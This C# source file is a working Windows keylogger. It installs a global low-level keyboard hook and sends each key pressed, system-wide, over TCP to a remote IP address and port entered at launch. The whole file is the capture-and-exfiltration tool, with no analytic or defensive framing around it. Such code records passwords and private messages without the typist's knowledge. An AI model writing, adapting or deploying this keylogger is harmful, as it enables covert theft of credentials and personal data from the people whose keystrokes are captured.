using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class KeyboardHook
{
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private const int WH_KEYBOARD_LL = 13;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string clientIp = "192.168.1.3"; // Replace with the client's IP address
    private static int port = 8888;

    public static void Main()
    {
        Console.Write("Enter IP here: ");
        clientIp = Console.ReadLine();

        if (CheckConnection(clientIp, port))
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Connected to the server.");
            _hookID = SetHook(_proc);
            Application.Run(); // Keep the application running to capture key presses
            UnhookWindowsHookEx(_hookID);
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Failed to connect to the server. Exiting...");
            Thread.Sleep(2000);
        }
    }

    private static bool CheckConnection(string ip, int port)
    {
        try
        {
            using (TcpClient client = new TcpClient())
            {
                client.Connect(ip, port);
                return client.Connected;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error during connection attempt: " + ex.Message);
            return false;
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)0x0100) // WM_KEYDOWN message
        {
            int vkCode = Marshal.ReadInt32(lParam);
            SendKeyPress(((Keys)vkCode).ToString());
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void SendKeyPress(string key)
    {
        try
        {
            using (TcpClient client = new TcpClient(clientIp, port))
            using (NetworkStream stream = client.GetStream())
            {
                byte[] data = Encoding.UTF8.GetBytes(key);
                stream.Write(data, 0, data.Length);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error sending key press: " + ex.Message);
        }
    }
}
